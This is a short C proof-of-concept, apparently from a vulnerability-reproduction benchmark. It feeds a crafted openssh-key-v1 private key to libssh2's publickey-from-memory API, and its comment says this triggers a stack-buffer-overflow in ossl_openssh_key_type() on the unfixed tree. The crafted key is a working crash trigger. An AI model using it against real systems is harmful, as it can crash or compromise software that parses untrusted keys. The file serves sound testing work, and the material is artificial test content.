/* PoC: crafted unencrypted ('none' cipher) openssh-key-v1 private key
   whose private section ends with a 35-byte key type string.

   Drives the documented public API libssh2_userauth_publickey_frommemory()
   with pubkeyblob == NULL, so the library derives the public key from the
   private key blob in-process, before any network I/O.

   On the shipped tree this aborts under AddressSanitizer with a
   stack-buffer-overflow in ossl_openssh_key_type() (src/openssl.c);
   on the golden tree (parent + real upstream fix) the key is rejected
   gracefully with LIBSSH2_ERROR_FILE. */

#include <libssh2.h>

#include <stdio.h>
#include <string.h>
#include <unistd.h>

static const char privkey[] =
    "-----BEGIN OPENSSH PRIVATE KEY-----\n"
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAAXgAAAAvQUJDRE\n"
    "FCQ0QAAAAjQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=\n"
    "-----END OPENSSH PRIVATE KEY-----\n";

int main(void)
{
    LIBSSH2_SESSION *session;
    int rc;

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 2;
    }

    rc = libssh2_userauth_publickey_frommemory(session, "user", 4,
                                               NULL, 0,
                                               privkey, strlen(privkey),
                                               NULL);
    fprintf(stderr, "userauth rc=%d\n", rc);
    fflush(stderr);

    /* skip teardown so a clean run does not depend on exit handlers */
    _exit(0);
}
